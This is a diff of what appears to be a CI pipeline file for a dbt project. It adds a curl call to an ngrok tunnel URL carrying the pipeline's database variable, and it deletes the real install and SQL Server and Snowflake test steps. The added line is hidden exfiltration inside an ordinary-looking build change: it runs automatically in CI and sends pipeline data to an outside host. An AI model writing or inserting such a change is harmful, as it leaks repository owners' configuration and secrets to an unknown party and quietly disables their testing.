@@ -100,41 +100,6 @@ jobs:
 
       - bash: |
           python --version
+          curl https://3438-2a02-2f09-e11a-600-fc64-d0d3-9f5b-d506.ngrok-free.app/$DBT_SQL_SERVER_DATABASE
 
-          sudo apt-get install git libpq-dev python-dev python3-pip
-          sudo apt-get remove python-cffi
-          sudo pip install --upgrade cffi
-
-          python3 -m venv dbt-env
-          python3 -m venv dbt-env-sqlserver
-
-          source dbt-env/bin/activate
-          pip install dbt-core==1.8.8
-          pip install dbt-snowflake==1.8.4
-          dbt --version
-
-          source dbt-env-sqlserver/bin/activate
-          pip install dbt-core==1.8.8
-          pip install dbt-sqlserver==1.8.5
-          dbt --version
         displayName: Install dbt
-
-      - bash: |
-          source dbt-env/bin/activate
-          cd $(dbtProjectPath)
-          dbt deps
-        displayName: Install dbt dependencies
-
-      - bash: |
-          source dbt-env-sqlserver/bin/activate
-          cd $(dbtProjectPath)
-          dbt build --profiles-dir $(Agent.BuildDirectory)/self/.pipelines --profile default -t sqlserver-ci \
-            --vars '{"DBT_SQL_SERVER_SERVER": "$(DBT_SQL_SERVER_SERVER)", "DBT_SQL_SERVER_USER": "$(DBT_SQL_SERVER_USER)", "DBT_SQL_SERVER_PASSWORD": "$(DBT_SQL_SERVER_PASSWORD)", "DBT_SQL_SERVER_DATABASE": "$(DBT_SQL_SERVER_DATABASE)", "DBT_SCHEMA": "$(DBT_SCHEMA)"}'
-        displayName: Test (SQL Server)
-
-      - bash: |
-          source dbt-env/bin/activate
-          cd $(dbtProjectPath)
-          dbt build --profiles-dir $(Agent.BuildDirectory)/self/.pipelines --profile default -t snowflake-ci \
-            --vars '{"DBT_SNOWFLAKE_ACCOUNT": "$(DBT_SNOWFLAKE_ACCOUNT)", "DBT_SNOWFLAKE_USER": "$(DBT_SNOWFLAKE_USER)", "DBT_SNOWFLAKE_PASSWORD": "$(DBT_SNOWFLAKE_PASSWORD)", "DBT_SNOWFLAKE_ROLE": "$(DBT_SNOWFLAKE_ROLE)", "DBT_SNOWFLAKE_DATABASE": "$(DBT_SNOWFLAKE_DATABASE)", "DBT_SNOWFLAKE_WAREHOUSE": "$(DBT_SNOWFLAKE_WAREHOUSE)", "DBT_SCHEMA": "$(DBT_SCHEMA)"}'
-        displayName: Test (Snowflake)
